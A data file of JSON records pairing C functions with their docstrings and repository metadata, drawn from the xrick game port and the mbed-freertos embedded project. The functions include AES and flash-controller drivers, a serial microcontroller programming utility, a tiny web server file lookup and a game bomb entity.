{"docstring": "/*\n * Entity action\n *\n * ASM 18CA\n */\n", "func_signal": "void\ne_bomb_action(UNUSED(U8 e))", "code": "{\n\t/* tick */\n\te_bomb_ticker--;\n\n\tif (e_bomb_ticker == 0)\n\t{\n\t\t/*\n\t\t * end: deactivate\n\t\t */\n\t\tE_BOMB_ENT.n = 0;\n\t\te_bomb_lethal = FALSE;\n\t}\n\telse if (e_bomb_ticker >= 0x0A)\n\t{\n\t\t/*\n\t\t * ticking\n\t\t */\n#ifdef ENABLE_SOUND\n\t\tif ((e_bomb_ticker & 0x03) == 0x02)\n\t\t\tsyssnd_play(WAV_BOMBSHHT, 1);\n#endif\n#ifdef GFXST\n\t\t/* ST bomb sprites sequence is longer */\n\t\tif (e_bomb_ticker < 40)\n\t\t\tE_BOMB_ENT.sprite = 0x99 + 19 - (e_bomb_ticker >> 1);\n\t\telse\n#endif\n\t\tE_BOMB_ENT.sprite = (e_bomb_ticker & 0x01) ? 0x23 : 0x22;\n\t}\n\telse if (e_bomb_ticker == 0x09)\n\t{\n\t\t/*\n\t\t * explode\n\t\t */\n#ifdef ENABLE_SOUND\n\t\tsyssnd_play(WAV_EXPLODE, 1);\n#endif\n#ifdef GFXPC\n\t\tE_BOMB_ENT.sprite = 0x24 + 4 - (e_bomb_ticker >> 1);\n#endif\n#ifdef GFXST\n\t\t/* See above: fixing alignment */\n\t\tE_BOMB_ENT.x -= 4;\n\t\tE_BOMB_ENT.y -= 5;\n\t\tE_BOMB_ENT.sprite = 0xa8 + 4 - (e_bomb_ticker >> 1);\n#endif\n\t\te_bomb_xc = E_BOMB_ENT.x + 0x0C;\n\t\te_bomb_yc = E_BOMB_ENT.y + 0x000A;\n\t\te_bomb_lethal = TRUE;\n\t\tif (e_bomb_hit(E_RICK_NO))\n\t\t\te_rick_gozombie();\n\t}\n\telse\n\t{\n\t\t/*\n\t\t * exploding\n\t\t */\n#ifdef GFXPC\n\t\tE_BOMB_ENT.sprite = 0x24 + 4 - (e_bomb_ticker >> 1);\n#endif\n#ifdef GFXST\n\t\tE_BOMB_ENT.sprite = 0xa8 + 4 - (e_bomb_ticker >> 1);\n#endif\n\t\t/* exploding, hence lethal */\n\t\tif (e_bomb_hit(E_RICK_NO))\n\t\t\te_rick_gozombie();\n\t}\n}", "path": "src\\e_bomb.c", "repo_name": "fabiensanglard/xrick", "stars": 58, "license": "None", "language": "c", "size": 1763}
{"docstring": "/*\n * Draw a tile\n * at position indicated by fb ; leave fb pointing to the next tile\n * to the right of the tile drawn\n *\n * ASM 1e6c\n * tlnbr: tile number\n * draw_filter: CGA colors filter\n * fb: CHANGED (see above)\n */\n", "func_signal": "void\ndraw_tile(U8 tileNumber)", "code": "{\n  U8 i, k, *f;\n\n#ifdef GFXPC\n  U16 x;\n#endif\n\n#ifdef GFXST\n  U32 x;\n#endif\n\n  f = fb;  /* frame buffer */\n  for (i = 0; i < 8; i++) {  /* for all 8 pixel lines */\n\n#ifdef GFXPC\n    x = tiles_data[draw_tilesBank][tileNumber][i] & draw_filter;\n    /*\n     * tiles / perform the transformation from CGA 2 bits\n     * per pixel to frame buffer 8 bits per pixels\n     */\n    for (k = 8; k--; x >>= 2)\n      f[k] = x & 3;\n    f += SYSVID_WIDTH;  /* next line */\n#endif\n\n#ifdef GFXST\n  x = tiles_data[draw_tilesBank][tileNumber][i];\n  /*\n   * tiles / perform the transformation from ST 4 bits\n   * per pixel to frame buffer 8 bits per pixels\n   */\n  for (k = 8; k--; x >>= 4)\n    f[k] = x & 0x0F;\n  f += SYSVID_WIDTH;  /* next line */\n#endif\n\n  }\n\n  fb += 8;  /* next tile */\n}", "path": "src\\draw.c", "repo_name": "fabiensanglard/xrick", "stars": 58, "license": "None", "language": "c", "size": 1763}
{"docstring": "/**\n * @brief\n *   Output feedback (OFB) cipher mode encryption/decryption, 256 bit key.\n *\n * @details\n *   Please see AES_OFB128() for OFB figure.\n *\n *   Please refer to general comments on layout and byte ordering of parameters.\n *\n * @param[out] out\n *   Buffer to place encrypted/decrypted data. Must be at least @p len long. It\n *   may be set equal to @p in, in which case the input buffer is overwritten.\n *\n * @param[in] in\n *   Buffer holding data to encrypt/decrypt. Must be at least @p len long.\n *\n * @param[in] len\n *   Number of bytes to encrypt/decrypt. Must be a multiple of 16.\n *\n * @param[in] key\n *   256 bit encryption key.\n *\n * @param[in] iv\n *   128 bit initalization vector to use.\n ******************************************************************************/\n", "func_signal": "void AES_OFB256(uint8_t *out,\n                const uint8_t *in,\n                unsigned int len,\n                const uint8_t *key,\n                const uint8_t *iv)", "code": "{\n  int            i;\n  int            j;\n  uint32_t       *_out = (uint32_t *) out;\n  const uint32_t *_in  = (const uint32_t *) in;\n  const uint32_t *_key = (const uint32_t *) key;\n  const uint32_t *_iv  = (const uint32_t *) iv;\n\n  EFM_ASSERT(!(len % AES_BLOCKSIZE));\n\n  /* Select encryption mode, trigger explicitly by command */\n  AES->CTRL = AES_CTRL_AES256;\n\n  /* Load initialization vector */\n  for (i = 3; i >= 0; i--)\n  {\n    AES->DATA = __REV(_iv[i]);\n  }\n\n  /* Encrypt/decrypt data */\n  len /= AES_BLOCKSIZE;\n  while (len--)\n  {\n    /* Load key */\n    for (i = 3, j = 7; i >= 0; i--, j--)\n    {\n      AES->KEYLA = __REV(_key[j]);\n      AES->KEYHA = __REV(_key[i]);\n    }\n\n    AES->CMD = AES_CMD_START;\n\n    /* Wait for completion */\n    while (AES->STATUS & AES_STATUS_RUNNING) ;\n\n    /* Save encrypted/decrypted data */\n    for (i = 3; i >= 0; i--)\n    {\n      _out[i] = __REV(AES->DATA) ^ _in[i];\n    }\n    _out += 4;\n    _in  += 4;\n  }\n}", "path": "lib\\efm32lib\\src\\efm32_aes.c", "repo_name": "hugovincent/mbed-freertos", "stars": 59, "license": "None", "language": "c", "size": 1671}
{"docstring": "/***************************** AnalogDevicesErase ***********************/\n/**  Erase the Analog Devices micro.  We take the simple way out and\njust erase the whole thing.\n*/\n", "func_signal": "static void AnalogDevicesErase(ISP_ENVIRONMENT *IspEnvironment)", "code": "{\n    BINARY pages;\n    AD_PACKET packet;\n\n    pages = 0;\n    DebugPrintf(2, \"Erasing .. \");\n    AnalogDevicesFormPacket(IspEnvironment, 'E', 1, 0, &pages, &packet);\n    AnalogDevicesSendPacket(IspEnvironment, &packet);\n    DebugPrintf(2, \"Erased\\n\");\n}", "path": "util\\lpc21isp\\adprog.c", "repo_name": "hugovincent/mbed-freertos", "stars": 59, "license": "None", "language": "c", "size": 1671}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "void\nhttpd_fs_init(void)", "code": "{\n#if HTTPD_FS_STATISTICS\n  u16_t i;\n  for(i = 0; i < HTTPD_FS_NUMFILES; i++) {\n    count[i] = 0;\n  }\n#endif /* HTTPD_FS_STATISTICS */\n}", "path": "apps\\webserver\\httpd-fs.c", "repo_name": "hugovincent/mbed-freertos", "stars": 59, "license": "None", "language": "c", "size": 1671}
{"docstring": "/**\n * @brief\n *   Generate 128 bit decryption key from 128 bit encryption key. The decryption\n *   key is used for some cipher modes when decrypting.\n *\n * @details\n *   Please refer to general comments on layout and byte ordering of parameters.\n *\n * @param[out] out\n *   Buffer to place 128 bit decryption key. Must be at least 16 bytes long. It\n *   may be set equal to @p in, in which case the input buffer is overwritten.\n *\n * @param[in] in\n *   Buffer holding 128 bit encryption key. Must be at least 16 bytes long.\n ******************************************************************************/\n", "func_signal": "void AES_DecryptKey128(uint8_t *out, const uint8_t *in)", "code": "{\n  int            i;\n  uint32_t       *_out = (uint32_t *) out;\n  const uint32_t *_in  = (const uint32_t *) in;\n\n  /* Load key */\n  for (i = 3; i >= 0; i--)\n  {\n    AES->KEYLA = __REV(_in[i]);\n  }\n\n  /* Do dummy encryption to generate decrypt key */\n  AES->CTRL = 0;\n  AES_IntClear(AES_IF_DONE);\n  AES->CMD = AES_CMD_START;\n\n  /* Wait for completion */\n  while (AES->STATUS & AES_STATUS_RUNNING) ;\n\n  /* Save decryption key */\n  for (i = 3; i >= 0; i--)\n  {\n    _out[i] = __REV(AES->KEYLA);\n  }\n}", "path": "lib\\efm32lib\\src\\efm32_aes.c", "repo_name": "hugovincent/mbed-freertos", "stars": 59, "license": "None", "language": "c", "size": 1671}
{"docstring": "/**\n * @brief\n *   Disables the flash controller for writing.\n ******************************************************************************/\n", "func_signal": "void MSC_Deinit(void)", "code": "{\n  /* Enable writing to the MSC */\n  MSC->WRITECTRL |= MSC_WRITECTRL_WREN;\n  /* Lock the MSC */\n  MSC->LOCK = 0;\n  /* Disable writing to the MSC */\n  MSC->WRITECTRL &= ~MSC_WRITECTRL_WREN;\n}", "path": "lib\\efm32lib\\src\\efm32_msc.c", "repo_name": "hugovincent/mbed-freertos", "stars": 59, "license": "None", "language": "c", "size": 1671}
{"docstring": "/* Print as much info as we can about the processor state pre-exception. */\n", "func_signal": "static __attribute__ ((noreturn)) void __print_info(enum ExceptionType type)", "code": "{\n\t// pc is the actual address, and pc_ptr is the actually opcode at that address\n\tswitch (type)\n\t{\n\t\tcase DataAbort:\n\t\t\tprintf(\"\\n[FreeRTOS] Fatal Error: Data Abort at pc : \");\n\t\t\t//printf(\"[<%08x>] -> 0x%08x\\n\", SavedRegs.pc, SavedRegs.pc_ptr);\n\t\t\tbreak;\n\n\t\tcase PrefetchAbort:\n\t\t\tprintf(\"\\n[FreeRTOS] Fatal Error: Prefetch Abort at pc : \");\n\t\t\t//printf(\"[<%08x>]\\n\", SavedRegs.pc);\n\t\t\tbreak;\n\n\t\tcase UndefinedInstruction:\n\t\t\tprintf(\"\\n[FreeRTOS] Fatal Error: Undefined Instruction \");\n\t\t\t//printf(\"0x%08x at pc : [<%08x>]\\n\", SavedRegs.pc_ptr, SavedRegs.pc);\n\t\t\tbreak;\n\t}\n\n\tputs(\"\\nProcesor State:\");\n\t//Debug_PrintSavedRegisterState(&SavedRegs);\n\n\tputs(\"\\nBacktrace:\");\n\t//Debug_PrintBacktrace((unsigned int *)SavedRegs.r[11], 0); // r11 is the frame pointer\n\n\t// FIXME some FreeRTOS-specific thread information should go here?\n\n\tputs(\"\\nHalting.\\n\");\n\n\t// Put processor core into sleep mode to conserve power.\n\tPowerManagement_PowerDown();\n}", "path": "mach\\cpu-lpc1768\\fault_handlers.c", "repo_name": "hugovincent/mbed-freertos", "stars": 59, "license": "None", "language": "c", "size": 1671}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "void vPortFree( void *pv )", "code": "{\n\tif( pv )\n\t{\n\t\tvTaskSuspendAll();\n\t\t{\n\t\t\tfree( pv );\n\t\t}\n\t\txTaskResumeAll();\n\t}\n}", "path": "kernel\\malloc_wrappers.c", "repo_name": "hugovincent/mbed-freertos", "stars": 59, "license": "None", "language": "c", "size": 1671}
{"docstring": "/***************************** AnalogDevicesWrite ***********************/\n/**  Write the program.\n\\param [in] data the program to download to the micro.\n\\param [in] address where to start placing the program.\n\\param [in] bytes the size of the progrm to download.\n*/\n", "func_signal": "static void AnalogDevicesWrite(ISP_ENVIRONMENT *IspEnvironment,\n                                         const void *data, long address, size_t bytes)", "code": "{\n    AD_PACKET packet;\n    const BINARY *prog_data;\n\n    DebugPrintf(2, \"Writing %d bytes \", bytes);\n    prog_data = (const BINARY*) data;\n    while (bytes > AD_PACKET_SIZE)\n    {\n        AnalogDevicesFormPacket(IspEnvironment, 'W', AD_PACKET_SIZE, address, prog_data, &packet);\n        AnalogDevicesSendPacket(IspEnvironment, &packet);\n        address += AD_PACKET_SIZE;\n        prog_data += AD_PACKET_SIZE;\n        bytes -= AD_PACKET_SIZE;\n        DebugPrintf(2, \".\");\n    }\n    if (bytes > 0)\n    {\n        AnalogDevicesFormPacket(IspEnvironment, 'W', bytes, address, prog_data, &packet);\n        AnalogDevicesSendPacket(IspEnvironment, &packet);\n        DebugPrintf(2, \".\");\n    }\n}", "path": "util\\lpc21isp\\adprog.c", "repo_name": "hugovincent/mbed-freertos", "stars": 59, "license": "None", "language": "c", "size": 1671}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "void *pvPortMalloc( size_t xWantedSize )", "code": "{\nvoid *pvReturn;\n\n\tvTaskSuspendAll();\n\t{\n\t\tpvReturn = malloc( xWantedSize );\n\t}\n\txTaskResumeAll();\n\n\t#if( configUSE_MALLOC_FAILED_HOOK == 1 )\n\t{\n\t\tif( pvReturn == NULL )\n\t\t{\n\t\t\textern void vApplicationMallocFailedHook( void );\n\t\t\tvApplicationMallocFailedHook();\n\t\t}\n\t}\n\t#endif\n\t\n\treturn pvReturn;\n}", "path": "kernel\\malloc_wrappers.c", "repo_name": "hugovincent/mbed-freertos", "stars": 59, "license": "None", "language": "c", "size": 1671}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "int\nhttpd_fs_open(const char *name, struct httpd_fs_file *file)", "code": "{\n#if HTTPD_FS_STATISTICS\n  u16_t i = 0;\n#endif /* HTTPD_FS_STATISTICS */\n  struct httpd_fsdata_file_noconst *f;\n\n  for(f = (struct httpd_fsdata_file_noconst *)HTTPD_FS_ROOT;\n      f != NULL;\n      f = (struct httpd_fsdata_file_noconst *)f->next) {\n\n    if(httpd_fs_strcmp(name, f->name) == 0) {\n      file->data = f->data;\n      file->len = f->len;\n#if HTTPD_FS_STATISTICS\n      ++count[i];\n#endif /* HTTPD_FS_STATISTICS */\n      return 1;\n    }\n#if HTTPD_FS_STATISTICS\n    ++i;\n#endif /* HTTPD_FS_STATISTICS */\n\n  }\n  return 0;\n}", "path": "apps\\webserver\\httpd-fs.c", "repo_name": "hugovincent/mbed-freertos", "stars": 59, "license": "None", "language": "c", "size": 1671}
{"docstring": "/**\n * @brief\n *   Generate 256 bit decryption key from 256 bit encryption key. The decryption\n *   key is used for some cipher modes when decrypting.\n *\n * @details\n *   Please refer to general comments on layout and byte ordering of parameters.\n *\n * @param[out] out\n *   Buffer to place 256 bit decryption key. Must be at least 32 bytes long. It\n *   may be set equal to @p in, in which case the input buffer is overwritten.\n *\n * @param[in] in\n *   Buffer holding 256 bit encryption key. Must be at least 32 bytes long.\n ******************************************************************************/\n", "func_signal": "void AES_DecryptKey256(uint8_t *out, const uint8_t *in)", "code": "{\n  int            i;\n  int            j;\n  uint32_t       *_out = (uint32_t *) out;\n  const uint32_t *_in  = (const uint32_t *) in;\n\n  /* Load key */\n  for (i = 3, j = 7; i >= 0; i--, j--)\n  {\n    AES->KEYLA = __REV(_in[j]);\n    AES->KEYHA = __REV(_in[i]);\n  }\n\n  /* Do dummy encryption to generate decrypt key */\n  AES->CTRL = AES_CTRL_AES256;\n  AES->CMD  = AES_CMD_START;\n\n  /* Wait for completion */\n  while (AES->STATUS & AES_STATUS_RUNNING) ;\n\n  /* Save decryption key */\n  for (i = 3, j = 7; i >= 0; i--, j--)\n  {\n    _out[j] = __REV(AES->KEYLA);\n    _out[i] = __REV(AES->KEYHA);\n  }\n}", "path": "lib\\efm32lib\\src\\efm32_aes.c", "repo_name": "hugovincent/mbed-freertos", "stars": 59, "license": "None", "language": "c", "size": 1671}
{"docstring": "/***************************** AnalogDevicesSendPacket ******************/\n/**  Send a previously form Analog Devices communication.  Retry a\ncouple of times if needed but fail by exiting the program if no ACK is\nforthcoming.\n\\param [in] packet the packet to send.\n*/\n", "func_signal": "static void AnalogDevicesSendPacket(ISP_ENVIRONMENT *IspEnvironment,\n                                                const AD_PACKET * packet)", "code": "{\n    BINARY response;\n    int retry = 0;\n\n    do {\n        retry++;\n\n        /*  Make sure we don't read garbage later instead of    */\n        /* the response we expect from the micro.               */\n        ClearSerialPortBuffers(IspEnvironment);\n\n        /*  Send the packet, the size is the number of data     */\n        /* bytes in the packet plus 3 bytes worth of header     */\n        /* plus checksum.                                       */\n        SendComPortBlock(IspEnvironment, packet, packet->bytes + 4);\n\n        /*  Receive the response and check, return to caller    */\n        /* if successful.                                       */\n        if (ReceiveComPortBlockComplete(IspEnvironment, &response, 1, 5000) == 0)\n        {\n            if (response == ANALOG_DEVICES_ACK)\n            {\n                DebugPrintf(3, \"Packet Sent\\n\");\n                return;\n            }\n            if (response != ANALOG_DEVICES_NAK)\n            {\n                DebugPrintf(3, \"Unexpected response to packet (%x)\\n\", (int)response);\n            }\n            DebugPrintf(2, \"*\");\n        }\n    } while (retry < 3);\n\n    DebugPrintf(1, \"Send packet failed\\n\");\n    exit(-1);\n}", "path": "util\\lpc21isp\\adprog.c", "repo_name": "hugovincent/mbed-freertos", "stars": 59, "license": "None", "language": "c", "size": 1671}
{"docstring": "/***************************** Terminal *********************************/\n/**  Acts as a simple dumb terminal. Press 'ESC' to exit.\n*/\n", "func_signal": "BOOL CheckTerminalParameters(ISP_ENVIRONMENT *IspEnvironment, char* pstr)", "code": "{\n    if (stricmp(pstr, \"-localecho\") == 0)\n    {\n        IspEnvironment->LocalEcho = 1;\n        DebugPrintf(3, \"Local echo in terminal mode.\\n\");\n        return TRUE;\n    }\n\n    if (stricmp(pstr, \"-term\") == 0)\n    {\n        IspEnvironment->TerminalAfterUpload = 1;\n        DebugPrintf(3, \"Invoke terminal after upload.\\n\");\n        return TRUE;\n    }\n\n    if (stricmp(pstr, \"-termonly\") == 0)\n    {\n        IspEnvironment->TerminalOnly    = 1;\n        IspEnvironment->ProgramChip    = 0;\n        DebugPrintf(3, \"Only provide terminal.\\n\");\n        return TRUE;\n    }\n\n    return FALSE;\n}", "path": "util\\lpc21isp\\lpcterm.c", "repo_name": "hugovincent/mbed-freertos", "stars": 59, "license": "None", "language": "c", "size": 1671}
{"docstring": "/* __CC_ARM */\n", "func_signal": "msc_Return_TypeDef MSC_ErasePage(uint32_t *startAddress)", "code": "{\n  int timeOut = MSC_PROGRAM_TIMEOUT;\n\n  /* Address must be aligned to pages */\n  EFM_ASSERT((((uint32_t) startAddress) & 0x1FF) == 0);\n\n  /* Enable writing to the MSC */\n  MSC->WRITECTRL |= MSC_WRITECTRL_WREN;\n\n  /* Load address */\n  MSC->ADDRB    = (uint32_t) startAddress;\n  MSC->WRITECMD = MSC_WRITECMD_LADDRIM;\n\n  /* Check for invalid address */\n  if (MSC->STATUS & MSC_STATUS_INVADDR)\n  {\n    /* Disable writing to the MSC */\n    MSC->WRITECTRL &= ~MSC_WRITECTRL_WREN;\n    return mscReturnInvalidAddr;\n  }\n\n  /* Check for write protected page */\n  if (MSC->STATUS & MSC_STATUS_LOCKED)\n  {\n    /* Disable writing to the MSC */\n    MSC->WRITECTRL &= ~MSC_WRITECTRL_WREN;\n    return mscReturnLocked;\n  }\n\n  /* Send erase page command */\n  MSC->WRITECMD = MSC_WRITECMD_ERASEPAGE;\n\n  /* Wait for the erase to complete */\n  while ((MSC->STATUS & MSC_STATUS_BUSY) && (timeOut != 0))\n  {\n    timeOut--;\n  }\n\n  if (timeOut == 0)\n  {\n    /* Disable writing to the MSC */\n    MSC->WRITECTRL &= ~MSC_WRITECTRL_WREN;\n    return mscReturnTimeOut;\n  }\n\n  /* Disable writing to the MSC */\n  MSC->WRITECTRL &= ~MSC_WRITECTRL_WREN;\n  return mscReturnOk;\n}", "path": "lib\\efm32lib\\src\\efm32_msc.c", "repo_name": "hugovincent/mbed-freertos", "stars": 59, "license": "None", "language": "c", "size": 1671}
{"docstring": "/***************************** AnalogDevicesFormPacket ******************/\n/**  Create an Analog Devices communication packet from the constituent\nelements.\n\\param [in] cmd The command being sent, one of 'E' for erase, 'W' for\nwrite, 'V' for verify or 'R' for run..\n\\param [in] no_bytes the number of data bytes to send with the command in\nthe packet.\n\\param [in] address the address to apply the command to.\n\\param [in] data the data to send with the packet, may be null if no_bytes\nis zero.\n\\param[out] packet that will be filled.\n*/\n", "func_signal": "static void AnalogDevicesFormPacket(ISP_ENVIRONMENT *IspEnvironment,\n                                                char cmd, int no_bytes, unsigned int address,\n                                                const void *data, AD_PACKET *packet)", "code": "{\n    BINARY checksum;\n    const BINARY *data_in;\n    int i;\n\n    (void)IspEnvironment; /* never used in this function */\n\n    /*  Some sanity checking on the arguments.  These should only   */\n    /* fail if there is a bug in the caller.                        */\n    /*  Check 1) that the number of data bytes is in an acceptable  */\n    /* range, 2) that we have a non-null pointer if data is being   */\n    /* put in the packet and 3) that we have a non-null pointer to  */\n    /* the packet to be filled. We just exit with an error message  */\n    /* if any of these tests fail.                                  */\n    if ((no_bytes < 0) || (no_bytes > 250))\n    {\n        DebugPrintf(1,\n            \"The number of bytes (%d) passed to FormPacket is invalid.\\n\",\n            no_bytes);\n        exit(-1);\n    }\n    if ((data == 0) && (no_bytes != 0))\n    {\n        DebugPrintf(1,\n            \"A null pointer to data paased to FormPacket when data was expected.\\n\");\n        exit(-1);\n    }\n    if (packet == 0)\n    {\n        DebugPrintf(1,\n            \"A null packet pointer was passed to FormPacket.\\n\");\n        exit(-1);\n    }\n\n    checksum = 0;               /*  Checksum starts at zero.            */\n\n    data_in = (BINARY*) data;             /*  Pointer pun so we can walk through  */\n    /* the data.                            */\n\n    packet->start1 = 0x7;       /*  The start of the packet is constant.*/\n    packet->start2 = 0xE;\n\n    /*  Fill in the rest of the packet and calculate the checksum   */\n    /* as we go.                                                    */\n\n    /* The number of bytes is the number of data bytes + the        */\n    /* address bytes + the command byte.                            */\n    packet->bytes = (BINARY)(no_bytes + 5);\n\n    checksum += packet->bytes;\n\n    /*  The command for the packet being sent.  No error checking   */\n    /* done on this.                                                */\n    packet->cmd = cmd;\n\n    checksum += cmd;\n\n    /*  Now break up the address and place in the proper packet     */\n    /* locations.                                                   */\n    packet->address_l = (BINARY)(address & 0xFF);\n    packet->address_m = (BINARY)((address >> 8) & 0xFF);\n    packet->address_u = (BINARY)((address >> 16) & 0xFF);\n    packet->address_h = (BINARY)((address >> 24) & 0xFF);\n\n    checksum += packet->address_l;\n    checksum += packet->address_m;\n    checksum += packet->address_u;\n    checksum += packet->address_h;\n\n    /*  Copy the data bytes into the packet.  We could use memcpy   */\n    /* but we have to calculate the checksum anyway.                */\n    for (i = 0; i < no_bytes; i++)\n    {\n        packet->data[i] = data_in[i];\n        checksum += data_in[i];\n    }\n\n    /*  Finally, add the checksum to the end of the packet.         */\n    packet->data[i] = (BINARY)-checksum;\n}", "path": "util\\lpc21isp\\adprog.c", "repo_name": "hugovincent/mbed-freertos", "stars": 59, "license": "None", "language": "c", "size": 1671}
{"docstring": "/**\n * @brief\n *   Update last 32 bits of 128 bit counter, by incrementing with 1.\n *\n * @details\n *   Notice that no special consideration is given to possible wrap around. If\n *   32 least significant bits are 0xFFFFFFFF, they will be updated to 0x00000000,\n *   ignoring overflow.\n *\n *   Please refer to general comments on layout and byte ordering of parameters.\n *\n * @param[in,out] ctr\n *   Buffer holding 128 bit counter to be updated.\n ******************************************************************************/\n", "func_signal": "void AES_CTRUpdate32Bit(uint8_t *ctr)", "code": "{\n  uint32_t *_ctr = (uint32_t *) ctr;\n\n  _ctr[3] = __REV(__REV(_ctr[3]) + 1);\n}", "path": "lib\\efm32lib\\src\\efm32_aes.c", "repo_name": "hugovincent/mbed-freertos", "stars": 59, "license": "None", "language": "c", "size": 1671}
{"docstring": "/***************************** AnalogDevicesDownload ********************/\n/**  Perform the download into an Analog Devices micro.  As a quick and\n* dirty hack against flash relocations at 0x80000\n* \\return 0 if ok, error code else\n* \\ToDo: possible to implement the return value instead of calling\n* exit() in sub-functions\n*/\n", "func_signal": "int AnalogDevicesDownload(ISP_ENVIRONMENT *IspEnvironment)", "code": "{\n    AnalogDevicesSync(IspEnvironment);\n    AnalogDevicesErase(IspEnvironment);\n    if (IspEnvironment->BinaryLength > 0x80000)\n    {\n        DebugPrintf(2, \"Note:  Flash remapped 0x80000 to 0.\\n\");\n        AnalogDevicesWrite(IspEnvironment, IspEnvironment->BinaryContent + 0x80000, 0, IspEnvironment->BinaryLength-0x80000);\n    }\n    else\n    {\n        AnalogDevicesWrite(IspEnvironment, IspEnvironment->BinaryContent, 0, IspEnvironment->BinaryLength);\n    }\n    return (0);\n}", "path": "util\\lpc21isp\\adprog.c", "repo_name": "hugovincent/mbed-freertos", "stars": 59, "license": "None", "language": "c", "size": 1671}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "static u8_t\nhttpd_fs_strcmp(const char *str1, const char *str2)", "code": "{\n  u8_t i;\n  i = 0;\n loop:\n\n  if(str2[i] == 0 ||\n     str1[i] == '\\r' ||\n     str1[i] == '\\n') {\n    return 0;\n  }\n\n  if(str1[i] != str2[i]) {\n    return 1;\n  }\n\n\n  ++i;\n  goto loop;\n}", "path": "apps\\webserver\\httpd-fs.c", "repo_name": "hugovincent/mbed-freertos", "stars": 59, "license": "None", "language": "c", "size": 1671}
{"docstring": "/***************************** AnalogDevicesSync ************************/\n/**  Attempt to synchronize with an Analog Device ARM micro.  Sends a\nbackspace and reads back the microcontrollers response.  Performs\nmultiple retries. Exits the program on error, returns to caller in the\ncase of success.\n*/\n", "func_signal": "static void AnalogDevicesSync(ISP_ENVIRONMENT *IspEnvironment)", "code": "{\n    BINARY sync;                        /* Holds sync command.          */\n    AD_SYNC_RESPONSE response;          /* Response from micro.         */\n    int sync_attempts;                  /* Number of retries.           */\n\n    /*  Make sure we don't read garbage later instead of the        */\n    /* response we expect from the micro.                           */\n    ClearSerialPortBuffers(IspEnvironment);\n\n    DebugPrintf(2, \"Synchronizing\\n\"); /* Progress report.             */\n\n    sync = ANALOG_DEVICES_SYNC_CHAR;    /* Build up sync command.       */\n\n    /*  Perform the actual sync attempt.  First send the sync       */\n    /* character, the attempt to read back the response.  For the   */\n    /* AD ARM micro this is a fixed length block.  If response is   */\n    /* received attempt to validate it by comparing the first       */\n    /* characters to those expected.  If the received block does    */\n    /* not validate or is incomplete empty the serial buffer and    */\n    /* retry.                                                       */\n    for (sync_attempts = 0; sync_attempts < 5; sync_attempts++)\n    {\n        SendComPortBlock(IspEnvironment, &sync, 1);\n\n        if (ReceiveComPortBlockComplete(IspEnvironment, &response, sizeof(response),\n            500) == 0)\n        {\n\n            if (memcmp(response.product_id, ANALOG_DEVICES_SYNC_RESPONSE,\n                ANALOG_DEVICES_SYNC_SIZE) == 0)\n            {\n                return;\n            }\n            else\n            {\n                DumpString(3, &response, sizeof(response),\n                    \"Unexpected response to sync attempt \");\n            }\n        }\n        else\n        {\n            DebugPrintf(3, \"No (or incomplete) answer on sync attempt\\n\");\n        }\n\n        ClearSerialPortBuffers(IspEnvironment);\n    }\n\n    DebugPrintf(1, \"No (or unacceptable) answer on sync attempt\\n\");\n    exit(4);\n}", "path": "util\\lpc21isp\\adprog.c", "repo_name": "hugovincent/mbed-freertos", "stars": 59, "license": "None", "language": "c", "size": 1671}
{"docstring": "/* __CC_ARM */\n", "func_signal": "msc_Return_TypeDef MSC_WriteWord(uint32_t *address, void *data, int numBytes)", "code": "{\n  int timeOut;\n  int wordCount;\n  int numWords;\n\n  /* Check alignment (Must be aligned to words) */\n  EFM_ASSERT(((uint32_t)address & 0x3) == 0);\n\n  /* Check number of bytes. Must be divisable by four */\n  EFM_ASSERT((numBytes & 0x3) == 0);\n\n  /* Enable writing to the MSC */\n  MSC->WRITECTRL |= MSC_WRITECTRL_WREN;\n\n  /* Convert bytes to words */\n  numWords = numBytes >> 2;\n\n  for (wordCount = 0; wordCount < numWords; wordCount++)\n  {\n    /* Load address */\n    MSC->ADDRB    = (uint32_t)(address + wordCount);\n    MSC->WRITECMD = MSC_WRITECMD_LADDRIM;\n\n    /* Check for invalid address */\n    if (MSC->STATUS & MSC_STATUS_INVADDR)\n    {\n      /* Disable writing to the MSC */\n      MSC->WRITECTRL &= ~MSC_WRITECTRL_WREN;\n      return mscReturnInvalidAddr;\n    }\n\n    /* Check for write protected page */\n    if (MSC->STATUS & MSC_STATUS_LOCKED)\n    {\n      /* Disable writing to the MSC */\n      MSC->WRITECTRL &= ~MSC_WRITECTRL_WREN;\n      return mscReturnLocked;\n    }\n\n    /* Wait for the MSC to be ready for a new data word */\n    /* Due to the timing of this function, the MSC should allready by ready */\n    timeOut = MSC_PROGRAM_TIMEOUT;\n    while (((MSC->STATUS & MSC_STATUS_WDATAREADY) == 0) && (timeOut != 0))\n    {\n      timeOut--;\n    }\n\n    /* Check for timeout */\n    if (timeOut == 0)\n    {\n      /* Disable writing to the MSC */\n      MSC->WRITECTRL &= ~MSC_WRITECTRL_WREN;\n      return mscReturnTimeOut;\n    }\n\n    /* Load data into write data register */\n    MSC->WDATA = *(((uint32_t *) data) + wordCount);\n\n    /* Trigger write once */\n    MSC->WRITECMD = MSC_WRITECMD_WRITEONCE;\n\n    /* Wait for the write to complete */\n    timeOut = MSC_PROGRAM_TIMEOUT;\n    while ((MSC->STATUS & MSC_STATUS_BUSY) && (timeOut != 0))\n    {\n      timeOut--;\n    }\n\n    /* Check for timeout */\n    if (timeOut == 0)\n    {\n      /* Disable writing to the MSC */\n      MSC->WRITECTRL &= ~MSC_WRITECTRL_WREN;\n      return mscReturnTimeOut;\n    }\n  }\n  /* Disable writing to the MSC */\n  MSC->WRITECTRL &= ~MSC_WRITECTRL_WREN;\n  return mscReturnOk;\n}", "path": "lib\\efm32lib\\src\\efm32_msc.c", "repo_name": "hugovincent/mbed-freertos", "stars": 59, "license": "None", "language": "c", "size": 1671}
